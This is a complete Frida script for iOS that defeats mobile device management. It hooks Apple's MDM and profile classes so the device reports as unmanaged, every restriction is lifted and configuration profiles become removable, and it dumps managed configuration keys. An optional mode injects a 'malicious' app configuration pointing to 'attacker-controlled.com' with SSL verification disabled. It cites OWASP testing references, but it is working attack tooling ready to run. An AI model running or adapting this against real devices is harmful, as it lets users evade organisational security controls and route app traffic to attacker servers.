/**
 * MDM BYPASS SCRIPT - iOS
 *
 * Comprehensive Frida script to bypass MDM enrollment status checks,
 * restrictions, and managed app configurations.
 *
 * Coverage:
 * - MDMClient.isDeviceManaged bypass
 * - MCProfileConnection.isManaged bypass
 * - MCFeatureSettings.isFeatureAllowed bypass
 * - MCProfileConnection.isRemovable bypass
 * - Managed configuration key injection
 * - Restrictions bypass (camera, app installation, etc.)
 *
 * Compatible with: Frida 16.x+, iOS 11-18
 * Usage: frida -U -f <BUNDLE_ID> -l mdm-bypass.js
 *        or
 *        frida -U <BUNDLE_ID> -l mdm-bypass.js
 *
 * OWASP MASTG References:
 * - MASTG-TEST-0232: Platform Interaction - MDM enrollment bypass
 * - MASTG-TEST-0230: Platform Interaction - Configuration profile abuse
 * - MASVS-RES: Resilience Requirements
 *
 * Credits:
 * - Frida: https://frida.re
 * - objection: https://github.com/sensepost/objection
 * - iOS MDM Reverse Engineering community
 */

const DEBUG_MODE = true;
const BYPASS_RESTRICTIONS = true;
const INJECT_MALICIOUS_CONFIG = false;

// Malicious configuration to inject (if INJECT_MALICIOUS_CONFIG is true)
const MALICIOUS_CONFIG = {
    "ServerURL": "https://attacker-controlled.com/api",
    "APIToken": "sk_live_malicious_token_abc123",
    "DisableSSLVerification": true
};

function log(message, level = "INFO") {
    const colors = {
        INFO: "\x1b[36m[INFO]\x1b[0m",
        SUCCESS: "\x1b[32m[+]\x1b[0m",
        WARNING: "\x1b[33m[!]\x1b[0m",
        ERROR: "\x1b[31m[!]\x1b[0m",
        HEADER: "\x1b[1;34m[*]\x1b[0m"
    };

    console.log(colors[level] + " " + message);
}

function getClassName(obj) {
    try {
        return obj.$className || "Unknown";
    } catch (e) {
        return "Unknown";
    }
}

function getNSStringValue(ptr) {
    try {
        if (!ptr || ptr.isNull()) {
            return null;
        }
        return new ObjC.Object(ptr).toString();
    } catch (e) {
        return null;
    }
}

if (ObjC.available) {
    try {
        ObjC.schedule(ObjC.mainQueue, function() {
            console.log("\n");
            log("==============================================", "HEADER");
            log("MDM BYPASS SCRIPT - iOS STARTED", "HEADER");
            log("==============================================", "HEADER");

            let hooksApplied = 0;

            // Registry of the bypasses this script claims to have installed.
            // The summary is rendered from it, so a hook that could not be
            // installed is reported as missing instead of as a success.
            const bypasses = {
                "MDM enrollment status bypassed": false,
                "Profile management status bypassed": false,
                "Feature restrictions bypassed": false,
                "Profile removal bypassed": false,
                "UserDefaults configuration monitored": false,
                "Allowed features monitored": false,
                "MDM restriction manager monitored": false
            };

            try {
                if (ObjC.classes.MDMClient) {
                    const MDMClient = ObjC.classes.MDMClient;

                    if (!MDMClient['- isDeviceManaged']) {
                        log("MDMClient does not expose isDeviceManaged", "WARNING");
                    } else
                    Interceptor.attach(MDMClient['- isDeviceManaged'].implementation, {
                        onEnter: function(args) {
                            if (DEBUG_MODE) {
                                log("MDMClient.isDeviceManaged called", "INFO");
                            }
                        },
                        onLeave: function(retval) {
                            const originalValue = retval.toString();
                            log("Original MDM status: " + originalValue, "INFO");

                            // Bypass: return false (unmanaged).
                            // isDeviceManaged returns a primitive BOOL, so the return
                            // register must hold 0. Replacing it with an NSNumber object
                            // pointer would be non-null and read back as YES (inverting
                            // the bypass).
                            retval.replace(ptr(0));
                            log("Bypassed MDM status: false (unmanaged)", "SUCCESS");

                            hooksApplied++;
                        }
                    });

                    bypasses["MDM enrollment status bypassed"] = true;
log("MDMClient.isDeviceManaged hooked successfully", "SUCCESS");
                } else {
                    log("MDMClient not found (may not be available)", "WARNING");
                }
            } catch (e) {
                log("MDMClient hook failed: " + e.message, "ERROR");
            }

            try {
                if (ObjC.classes.MCProfileConnection) {
                    const MCProfileConnection = ObjC.classes.MCProfileConnection;

                    if (!MCProfileConnection['- isManaged']) {
                        log("MCProfileConnection does not expose isManaged", "WARNING");
                    } else
                    Interceptor.attach(MCProfileConnection['- isManaged'].implementation, {
                        onEnter: function(args) {
                            if (DEBUG_MODE) {
                                log("MCProfileConnection.isManaged called", "INFO");
                            }
                        },
                        onLeave: function(retval) {
                            const originalValue = retval.toString();
                            log("Original profile managed status: " + originalValue, "INFO");

                            // Bypass: return false (not managed).
                            // isManaged returns a primitive BOOL — replace with 0, not an
                            // NSNumber object pointer (non-null would be read back as YES).
                            retval.replace(ptr(0));
                            log("Bypassed profile status: false (not managed)", "SUCCESS");

                            hooksApplied++;
                        }
                    });

                    bypasses["Profile management status bypassed"] = true;
log("MCProfileConnection.isManaged hooked successfully", "SUCCESS");
                } else {
                    log("MCProfileConnection not found", "WARNING");
                }
            } catch (e) {
                log("MCProfileConnection hook failed: " + e.message, "ERROR");
            }

            try {
                if (ObjC.classes.MCFeatureSettings) {
                    const MCFeatureSettings = ObjC.classes.MCFeatureSettings;

                    if (!MCFeatureSettings['+ isFeatureAllowed:error:']) {
                        log("MCFeatureSettings does not expose isFeatureAllowed:error:", "WARNING");
                    } else
                    Interceptor.attach(MCFeatureSettings['+ isFeatureAllowed:error:'].implementation, {
                        onEnter: function(args) {
                            if (DEBUG_MODE) {
                                const feature = ObjC.Object(args[2]);
                                log("MCFeatureSettings.isFeatureAllowed: " + feature, "INFO");
                            }
                        },
                        onLeave: function(retval) {
                            if (DEBUG_MODE) {
                                const originalValue = retval.toString();
                                log("Original feature allowed: " + originalValue, "INFO");
                            }

                            if (BYPASS_RESTRICTIONS) {
                                // Bypass: return true (allowed).
                                // isFeatureAllowed:error: returns a primitive BOOL — replace
                                // with 1, not an NSNumber object pointer.
                                retval.replace(ptr(1));

                                if (DEBUG_MODE) {
                                    log("Bypassed feature allowed: true (allowed)", "SUCCESS");
                                }
                            }

                            hooksApplied++;
                        }
                    });

                    bypasses["Feature restrictions bypassed"] = true;
log("MCFeatureSettings.isFeatureAllowed hooked successfully", "SUCCESS");
                } else {
                    log("MCFeatureSettings not found", "WARNING");
                }
            } catch (e) {
                log("MCFeatureSettings hook failed: " + e.message, "ERROR");
            }

            try {
                if (ObjC.classes.MCProfileConnection) {
                    const MCProfileConnection = ObjC.classes.MCProfileConnection;

                    if (!MCProfileConnection['- isRemovable']) {
                        log("MCProfileConnection does not expose isRemovable", "WARNING");
                    } else
                    Interceptor.attach(MCProfileConnection['- isRemovable'].implementation, {
                        onEnter: function(args) {
                            if (DEBUG_MODE) {
                                log("MCProfileConnection.isRemovable called", "INFO");
                            }
                        },
                        onLeave: function(retval) {
                            const originalValue = retval.toString();
                            log("Original profile removable: " + originalValue, "INFO");

                            // Bypass: return true (removable).
                            // isRemovable returns a primitive BOOL — replace with 1, not an
                            // NSNumber object pointer.
                            retval.replace(ptr(1));
                            log("Bypassed profile removable: true (removable)", "SUCCESS");

                            hooksApplied++;
                        }
                    });

                    bypasses["Profile removal bypassed"] = true;
log("MCProfileConnection.isRemovable hooked successfully", "SUCCESS");
                } else {
                    log("MCProfileConnection not found for isRemovable", "WARNING");
                }
            } catch (e) {
                log("MCProfileConnection.isRemovable hook failed: " + e.message, "ERROR");
            }

            try {
                const UserDefaults = ObjC.classes.NSUserDefaults;
                const standardUserDefaults = UserDefaults.standardUserDefaults();

                Interceptor.attach(UserDefaults['- objectForKey:'].implementation, {
                    onEnter: function(args) {
                        this.key = ObjC.Object(args[2]);

                        if (DEBUG_MODE && this.key) {
                            log("UserDefaults.objectForKey: " + this.key, "INFO");
                        }
                    },
                    onLeave: function(retval) {
                        if (this.key && INJECT_MALICIOUS_CONFIG) {
                            const keyStr = this.key.toString();

                            // Check if key matches malicious configuration
                            if (MALICIOUS_CONFIG[keyStr]) {
                                const maliciousValue = MALICIOUS_CONFIG[keyStr];
                                log("Injecting malicious configuration for key: " + keyStr, "WARNING");
                                log("Malicious value: " + maliciousValue, "WARNING");

                                // Inject malicious value
                                let injectedValue;
                                if (typeof maliciousValue === "boolean") {
                                    injectedValue = ObjC.classes.NSNumber.numberWithBool_(maliciousValue);
                                } else {
                                    injectedValue = ObjC.classes.NSString.stringWithString_(maliciousValue);
                                }

                                retval.replace(injectedValue);
                                hooksApplied++;
                            }
                        }
                    }
                });

                bypasses["UserDefaults configuration monitored"] = true;
log("UserDefaults.objectForKey hooked successfully", "SUCCESS");
            } catch (e) {
                log("UserDefaults hook failed: " + e.message, "ERROR");
            }

            try {
                const UserDefaults = ObjC.classes.NSUserDefaults;

                // Try to find managed app configuration
                const managedSuites = [
                    "com.apple.configuration.managed",
                    "com.apple.application-identifier"
                ];

                managedSuites.forEach(suiteName => {
                    try {
                        const sharedDefaults = UserDefaults.alloc().initWithSuiteName_(suiteName);

                        if (sharedDefaults) {
                            log("\nManaged Configuration Suite: " + suiteName, "HEADER");

                            const dict = sharedDefaults.dictionaryRepresentation();

                            if (dict) {
                                const keys = dict.allKeys();
                                if (keys) {
                                    log("Total managed keys: " + keys.count(), "INFO");

                                    for (let i = 0; i < keys.count(); i++) {
                                        const key = keys.objectAtIndex_(i);
                                        const value = dict.objectForKey_(key);

                                        log("  " + key + " = " + value, "INFO");
                                    }
                                } else {
                                    log("No managed keys found", "INFO");
                                }
                            }
                        }
                    } catch (e) {
                        // Ignore if suite not found
                    }
                });
            } catch (e) {
                log("Failed to dump managed configuration: " + e.message, "ERROR");
            }

            try {
                if (ObjC.classes.MCProfileConnection) {
                    const MCProfileConnection = ObjC.classes.MCProfileConnection;

                    if (!MCProfileConnection['- allowedFeatures']) {
                        log("MCProfileConnection does not expose allowedFeatures", "WARNING");
                    } else
                    Interceptor.attach(MCProfileConnection['- allowedFeatures'].implementation, {
                        onEnter: function(args) {
                            if (DEBUG_MODE) {
                                log("MCProfileConnection.allowedFeatures called", "INFO");
                            }
                        },
                        onLeave: function(retval) {
                            if (BYPASS_RESTRICTIONS) {
                                log("Bypassing allowedFeatures - returning all features as allowed", "SUCCESS");

                                // Return all features as allowed
                                const allFeatures = ObjC.classes.NSSet.set();
                                retval.replace(allFeatures);

                                hooksApplied++;
                            }
                        }
                    });

                    bypasses["Allowed features monitored"] = true;
log("MCProfileConnection.allowedFeatures hooked successfully", "SUCCESS");
                } else {
                    log("MCProfileConnection not found for allowedFeatures", "WARNING");
                }
            } catch (e) {
                log("MCProfileConnection.allowedFeatures hook failed: " + e.message, "ERROR");
            }

            try {
                if (ObjC.classes.MDRRestrictionManager) {
                    const MDRRestrictionManager = ObjC.classes.MDRRestrictionManager;

                    if (!MDRRestrictionManager['- isAllowedForFeature:error:']) {
                        log("MDRRestrictionManager does not expose isAllowedForFeature:error:", "WARNING");
                    } else
                    Interceptor.attach(MDRRestrictionManager['- isAllowedForFeature:error:'].implementation, {
                        onEnter: function(args) {
                            if (DEBUG_MODE) {
                                const feature = ObjC.Object(args[2]);
                                log("MDRRestrictionManager.isAllowedForFeature: " + feature, "INFO");
                            }
                        },
                        onLeave: function(retval) {
                            if (BYPASS_RESTRICTIONS) {
                                const originalValue = retval.toString();
                                log("Original restriction: " + originalValue, "INFO");

                                // Bypass: return true (allowed).
                                // isAllowedForFeature:error: returns a primitive BOOL —
                                // replace with 1, not an NSNumber object pointer.
                                retval.replace(ptr(1));

                                log("Bypassed restriction: true (allowed)", "SUCCESS");
                            }

                            hooksApplied++;
                        }
                    });

                    bypasses["MDM restriction manager monitored"] = true;
log("MDRRestrictionManager.isAllowedForFeature hooked successfully", "SUCCESS");
                } else {
                    log("MDRRestrictionManager not found", "WARNING");
                }
            } catch (e) {
                log("MDRRestrictionManager hook failed: " + e.message, "ERROR");
            }

            console.log("\n");
            log("==============================================", "HEADER");
            log("MDM BYPASS SUMMARY", "HEADER");
            log("==============================================", "HEADER");
            log("Total hooks applied: " + hooksApplied, "SUCCESS");
            log("\nBypasses:", "HEADER");
            const bypassNames = Object.keys(bypasses);
            let enabledCount = 0;
            for (const name of bypassNames) {
                if (bypasses[name]) {
                    enabledCount++;
                    log("  [+] " + name, "SUCCESS");
                } else {
                    log("  [-] " + name + " NOT hooked (class or selector not found)", "WARNING");
                }
            }

            if (BYPASS_RESTRICTIONS) {
                log("  - All MDM restrictions bypassed", "SUCCESS");
            }

            if (INJECT_MALICIOUS_CONFIG) {
                log("  - Malicious configuration injection enabled", "WARNING");
            }

            console.log("\n");
        });
    } catch (e) {
        log("Error scheduling hooks: " + e.message, "ERROR");
    }
} else {
    log("Objective-C runtime not available. This script requires an iOS app.", "ERROR");
}
